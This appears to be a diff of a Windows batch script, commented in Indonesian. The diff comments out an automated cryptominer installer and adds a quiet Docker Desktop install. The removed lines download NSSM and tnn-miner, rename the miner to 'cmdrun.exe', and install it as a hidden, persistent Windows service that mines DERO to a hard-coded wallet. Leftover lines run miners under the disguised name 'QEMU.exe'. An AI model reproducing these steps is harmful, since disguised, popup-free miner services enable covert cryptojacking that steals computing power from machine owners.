@@ -8,61 +8,75 @@ cls
 #C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a rx/0 -k
 #C:\Users\%USERNAME%\Downloads\there0\QEMU.exe -d dero-node.mysrv.cloud:10100 -w dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c -t 5 --never-stop --restart-on-zero-hashrate
 
-@echo off
-echo ===============================
-echo   MEMULAI INSTALASI OTOMATIS
-echo ===============================
+#echo ===============================
+#echo   MEMULAI INSTALASI OTOMATIS
+#echo ===============================
 
-echo.
-echo [1] Mengunduh NSSM...
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://nssm.cc/release/nssm-2.24.zip','nssm.zip')"
+#echo.
+#echo [1] Mengunduh NSSM...
+#powershell -Command "(New-Object Net.WebClient).DownloadFile('https://nssm.cc/release/nssm-2.24.zip','nssm.zip')"
 
-echo [2] Mengekstrak NSSM...
-powershell -Command "Expand-Archive -Path 'nssm.zip' -DestinationPath '.' -Force"
+#echo [2] Mengekstrak NSSM...
+#powershell -Command "Expand-Archive -Path 'nssm.zip' -DestinationPath '.' -Force"
 
-echo [3] Membuat folder C:\nssm...
-mkdir C:\nssm >nul 2>&1
+#echo [3] Membuat folder C:\nssm...
+#mkdir C:\nssm >nul 2>&1
 
-echo [4] Memindahkan nssm.exe...
-copy .\nssm-2.24\win64\nssm.exe C:\nssm\nssm.exe >nul
+#echo [4] Memindahkan nssm.exe...
+#copy .\nssm-2.24\win64\nssm.exe C:\nssm\nssm.exe >nul
 
-echo Membersihkan file NSSM...
-del nssm.zip
-rmdir /s /q nssm-2.24
+#echo Membersihkan file NSSM...
+#del nssm.zip
+#rmdir /s /q nssm-2.24
 
-echo.
-echo ===================================
-echo   NSSM BERHASIL DIDOWNLOAD & SIAP
-echo ===================================
-echo.
+#echo.
+#echo ===================================
+#echo   NSSM BERHASIL DIDOWNLOAD & SIAP
+#echo ===================================
+#echo.
 
-echo [5] Mengunduh TNN...
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.5.4/downloads/Tnn-miner-win64-v0.5.4.zip','Tnn.zip')"
+#echo [5] Mengunduh TNN...
+#powershell -Command "(New-Object Net.WebClient).DownloadFile('https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.5.4/downloads/Tnn-miner-win64-v0.5.4.zip','Tnn.zip')"
 
-echo [6] Mengekstrak...
-powershell -Command "Expand-Archive -Path 'Tnn.zip' -DestinationPath '.' -Force"
+#echo [6] Mengekstrak...
+#powershell -Command "Expand-Archive -Path 'Tnn.zip' -DestinationPath '.' -Force"
 
-echo [7] Menghapus file ZIP...
-del Tnn.zip
+#echo [7] Menghapus file ZIP...
+#del Tnn.zip
 
-echo [8] Mengganti nama...
-rename tnn-miner-cpu.exe cmdrun.exe
+#echo [8] Mengganti nama...
+#rename tnn-miner-cpu.exe cmdrun.exe
 
-echo.
-echo =====================================
-echo    MEMBUAT SERVICE TANPA POPUP
-echo =====================================
+#echo.
+#echo =====================================
+#echo    MEMBUAT SERVICE TANPA POPUP
+#echo =====================================
 
-echo [9] Install sebagai Windows Service...
-C:\nssm\nssm.exe install TNN "%cd%\cmdrun.exe" "--daemon-address dero-node.mysrv.cloud --port 10100 --wallet dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c --threads 5 --dev-fee 1"
+#echo [9] Install sebagai Windows Service...
+#C:\nssm\nssm.exe install TNN "%cd%\cmdrun.exe" "--daemon-address dero-node.mysrv.cloud --port 10100 --wallet dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c --threads 5 --dev-fee 1"
 
-echo [10] Menjalankan service TNN...
-net start TNN
+#echo [10] Menjalankan service TNN...
+#net start TNN
 
-echo.
-echo ==============================================
-echo   SELESAI! BERJALAN TANPA POPUP SELAMANYA
-echo ==============================================
+#echo.
+#echo ==============================================
+#echo   SELESAI! BERJALAN TANPA POPUP SELAMANYA
+#echo ==============================================
+
+echo Downloading Docker Desktop installer...
+powershell -Command "Invoke-WebRequest -Uri 'https://desktop.docker.com/win/stable/Docker%20Desktop%20Installer.exe' -OutFile '%TEMP%\DockerDesktopInstaller.exe'"
+
+echo Installing Docker Desktop...
+start /wait "" "%TEMP%\DockerDesktopInstaller.exe" install --quiet
+
+echo Waiting a few seconds for Docker to initialize...
+timeout /t 10 /nobreak >nul
+
+echo Checking Docker version...
+docker --version
+docker info
+
+echo Docker installation complete.
 
 pause
 
